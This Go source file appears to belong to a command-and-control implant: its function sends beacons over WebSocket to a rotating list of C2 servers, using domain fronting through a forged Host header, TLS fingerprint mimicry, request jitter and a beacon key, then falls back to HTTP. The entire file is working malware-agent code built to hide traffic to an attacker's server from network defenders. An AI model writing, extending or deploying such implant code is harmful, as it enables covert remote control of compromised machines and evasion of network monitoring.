//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"fmt"
	"net/http"
	"net/url"
	"time"

	"github.com/gorilla/websocket"
)

func sendWSSBeacon(body []byte) []byte {
	startIdx := currentC2Idx
	for i := 0; i < len(C2URLs); i++ {
		idx := (startIdx + i) % len(C2URLs)
		c2URL := C2URLs[idx]

		beaconURI := getActiveBeaconURI()
		if ContentLengthJitter > 0 {
			beaconURI = addRandomParam(beaconURI)
		}

		wsURL, err := buildWSURL(c2URL, beaconURI)
		if err != nil {
			if Debug {
				fmt.Printf("[!] WS URL build failed for %s: %v\n", c2URL, err)
			}
			continue
		}

		var dialer *websocket.Dialer
		if chameleonEnabled {
			dialer = &websocket.Dialer{
				HandshakeTimeout: 10 * time.Second,
				NetDialContext:   utlsDialContext,
			}
		} else {
			dialer = &websocket.Dialer{
				HandshakeTimeout: 10 * time.Second,
				TLSClientConfig:  newAgentTLSConfig(DomainFront),
			}
		}

		header := http.Header{}
		if DomainFront != "" {
			header.Set("Host", DomainFront)
		}
		if beaconKey != "" {
			header.Set("X-Beacon-Key", beaconKey)
		}

		conn, _, err := dialer.Dial(wsURL, header)
		if err != nil {
			if Debug {
				fmt.Printf("[!] WS beacon to %s failed: %v\n", wsURL, err)
			}
			continue
		}

		err = conn.WriteMessage(websocket.TextMessage, body)
		if err != nil {
			if Debug {
				fmt.Printf("[!] WS write to %s failed: %v\n", wsURL, err)
			}
			conn.Close()
			continue
		}

		conn.SetReadDeadline(time.Now().Add(30 * time.Second))
		_, resp, err := conn.ReadMessage()
		conn.Close()
		if err != nil {
			if Debug {
				fmt.Printf("[!] WS read from %s failed: %v\n", wsURL, err)
			}
			continue
		}

		currentC2Idx = idx
		if Debug {
			fmt.Printf("[+] WS Beacon OK from %s, response %d bytes\n", wsURL, len(resp))
		}
		return resp
	}

	if Debug {
		fmt.Println("[!] All WS endpoints failed, falling back to HTTP")
	}
	return sendBeacon(body)
}

func buildWSURL(c2URL, path string) (string, error) {
	u, err := url.Parse(c2URL)
	if err != nil {
		return "", err
	}

	scheme := "ws"
	if u.Scheme == "https" || u.Scheme == "wss" {
		scheme = "wss"
	}

	host := u.Host
	if host == "" {
		host = u.Path
	}

	return fmt.Sprintf("%s://%s%s", scheme, host, path), nil
}
